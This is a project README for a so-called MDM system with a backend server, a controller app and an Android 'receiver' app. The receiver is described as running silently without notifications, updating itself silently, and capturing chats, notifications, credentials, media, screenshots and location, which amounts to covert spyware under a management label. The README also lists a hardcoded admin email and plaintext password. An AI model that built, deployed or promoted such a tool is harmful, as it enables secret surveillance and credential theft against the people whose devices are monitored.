# Dual App MDM System

Complete mobile device management solution with backend server, receiver app, and controller app.

## 🎯 Overview

This system consists of three main components:

1. **Backend Server** - Node.js/Express API with WebSocket support
2. **Receiver App** - Android app that runs silently on managed devices
3. **Controller App** - Android app for administrators and device owners

## ✨ Features

### Backend Server
- RESTful API with role-based authentication
- WebSocket server for real-time updates
- FCM push notification service
- Device management and command queue system
- SQLite database with device ownership

### Receiver App
- **Silent Operation** - Runs completely in background (no user notifications)
- **Device Registration** - Auto-registers on startup with device info
- **Command Execution** - Receives commands via FCM push or polling
- **Screenshot Capture** - Captures screenshots on command (Android 11+)
- **Location Tracking** - Tracks location every 5 minutes or on movement
- **Data Capture** - Captures notifications, chats, credentials, media
- **Auto-Update** - Silent automatic updates from server

### Controller App
- **Dual Authentication** - Admin (email/password) and Device Owner (6-digit alphanumeric)
- **Device Management** - View and manage devices with role-based filtering
- **MDM Controls** - Send commands to devices (Admin: full control, Device Owner: view-only)
- **Real-time Updates** - WebSocket connection for live device status and command updates
- **Material Design 3** - Modern, responsive UI

## 🚀 Quick Start

See **[QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)** for detailed setup instructions.

### Backend
```bash
cd server
npm install
npm start
```

### Receiver App
1. Open `app/` in Android Studio
2. Configure server URL in app settings
3. Build and install on device

### Controller App
1. Open `controller-app/` in Android Studio
2. Configure server URL
3. Build and install

## 📁 Project Structure

```
chats/
├── server/              # Backend Node.js server
│   ├── routes/          # API endpoints
│   ├── services/        # FCM, WebSocket services
│   └── middleware/      # Auth, authorization
│
├── app/                 # Receiver App (Android)
│   └── src/main/java/com/chats/capture/
│       ├── managers/    # Device registration, command polling
│       ├── services/    # FCM, location, accessibility
│       └── network/     # API client
│
└── controller-app/      # Controller App (Android)
    └── src/main/java/com/chats/controller/
        ├── auth/        # Authentication
        ├── network/     # API client, WebSocket
        └── ui/          # Activities, fragments
```

## 📚 Documentation

- **[QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)** - Get started in 5 minutes ⭐
- **[DOCUMENTATION_INDEX.md](DOCUMENTATION_INDEX.md)** - Complete documentation index
- **[PROJECT_COMPLETION_SUMMARY.md](PROJECT_COMPLETION_SUMMARY.md)** - Project overview
- **[DUAL_APP_MDM_STATUS.md](DUAL_APP_MDM_STATUS.md)** - Implementation status
- **[REALTIME_UPDATES_INTEGRATION.md](REALTIME_UPDATES_INTEGRATION.md)** - WebSocket guide
- **[controller-app/README.md](controller-app/README.md)** - Controller app details
- **[server/README.md](server/README.md)** - Backend API documentation

## 🔐 Authentication

### Admin
- Email: `bilal@admin.com`
- Password: `Bil@l112`
- Access: All devices, full MDM control

### Device Owner
- Username: 6-digit alphanumeric (e.g., `A1B2C3`)
- Password: 6-digit alphanumeric (e.g., `X9Y8Z7`)
- Access: Assigned device only, view-only

## 🎮 Usage

### Admin Workflow
1. Login to controller app
2. View all registered devices
3. Select device to manage
4. Send MDM commands (screenshot, sync, update, restart)
5. Monitor real-time status updates

### Device Owner Workflow
1. Login to controller app with 6-digit credentials
2. View assigned device
3. Monitor device status and data
4. View-only access (no command execution)

## 🔧 Configuration

### Server URL
- **Receiver App**: Configure in app settings
- **Controller App**: Set in SharedPreferences or `ControllerApplication.kt`

### Firebase (FCM)
- Place `google-services.json` in `app/src/main/`
- Configure Firebase project for push notifications

## 🧪 Testing

### Test Device Registration
1. Install receiver app
2. Check server logs for registration
3. Verify device appears in controller app

### Test MDM Commands
1. Login to controller app as admin
2. Select device
3. Send command (e.g., "Capture Screenshot")
4. Verify command executes on receiver app

### Test Real-time Updates
1. Send command from controller app
2. Watch for real-time status update
3. Verify device status updates automatically

## 📊 API Endpoints

### Authentication
- `POST /api/auth/login` - Login (Admin/Device Owner)
- `GET /api/auth/me` - Get current user

### Devices
- `POST /api/devices/register` - Register device
- `GET /api/devices` - List devices (role-filtered)
- `GET /api/devices/:deviceId` - Get device details

### Commands
- `POST /api/commands` - Queue command
- `GET /api/devices/:deviceId/commands/pending` - Get pending commands
- `PUT /api/commands/:commandId/result` - Update command result

## 🌐 WebSocket Events

- `data_update` - New data from receiver apps
- `device_status_update` - Device status changes
- `command_update` - Command execution status

## 🔒 Security

- JWT token authentication
- HTTPS only for API calls
- Role-based access control
- Server-side authorization checks
- Secure token storage
- Password hashing (bcrypt)

## 📝 Requirements

- Node.js 16+
- Android Studio
- Android SDK 26+ (API level 26+)
- Firebase project (for FCM)

## 🐛 Troubleshooting

See **[QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)** troubleshooting section.

Common issues:
- Connection refused → Server not running
- Invalid credentials → Check login details
- No devices found → Verify receiver app is running
- WebSocket failed → Check JWT token and network

## 📄 License

Private use only.

## 📞 Support

For detailed documentation, see:
- **[DOCUMENTATION_INDEX.md](DOCUMENTATION_INDEX.md)** - Complete documentation guide
- **[QUICK_START_GUIDE.md](QUICK_START_GUIDE.md)** - Setup and troubleshooting

---

**Status:** ✅ Production Ready  
**Version:** 1.0.0  
**Last Updated:** 2026-01-17
